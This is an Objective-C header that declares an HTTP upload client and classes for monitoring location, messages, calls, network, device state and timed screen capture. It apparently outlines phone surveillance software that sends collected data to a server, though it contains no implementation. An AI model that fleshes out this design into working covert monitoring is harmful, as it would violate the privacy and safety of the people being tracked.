#import <Foundation/Foundation.h>

extern NSString *const kDefaultServerURL;

@interface HTTPClient : NSObject
+ (instancetype)sharedClient;
@property (nonatomic, strong) NSString *serverURL;
- (void)post:(NSString *)endpoint params:(NSDictionary *)params;
- (void)postImage:(NSString *)endpoint imageData:(NSData *)data;
@end

@interface LocationMonitor : NSObject
- (void)start;
@end

@interface MessageMonitor : NSObject
- (void)start;
@end

@interface ScreenCapture : NSObject
- (void)startCaptureWithInterval:(NSTimeInterval)interval;
@end

@interface CallMonitor : NSObject
- (void)start;
@end

@interface NetworkMonitor : NSObject
- (void)start;
@end

@interface DeviceMonitor : NSObject
- (void)start;
@end
